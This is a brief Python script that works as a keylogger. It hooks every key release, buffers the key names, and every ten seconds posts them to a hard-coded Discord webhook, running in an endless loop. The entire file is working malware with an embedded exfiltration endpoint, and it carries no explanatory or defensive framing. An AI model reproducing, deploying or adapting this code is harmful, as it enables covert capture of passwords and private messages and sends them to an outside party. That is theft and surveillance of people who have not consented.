
import keyboard
import time 
import requests
import threading
 
WEBHOOK_URL = 'https://discord.com/api/webhooks/1124243268553687121/dP2YXK2DnTmO-KmYXOPwoB0htB0SG33eyMs5n8DWs9lgB8tdIEjR_YJIuc32C1E5u-Uz'

keylogs =[]

def send_keylogs():
    global keylogs

    if keylogs:
        keylogs_str ='\n'.join(keylogs)

        payload = {

            'content' : keylogs_str
        }

        requests.post(WEBHOOK_URL,data=payload)

        keylogs =[]

    threading.Timer(10,send_keylogs).start()

def capture_keystrokes(events):
    global keylogs
    keylogs.append(events.name)

keyboard.on_release(callback=capture_keystrokes)

send_keylogs()
while True:
    time.sleep(1)

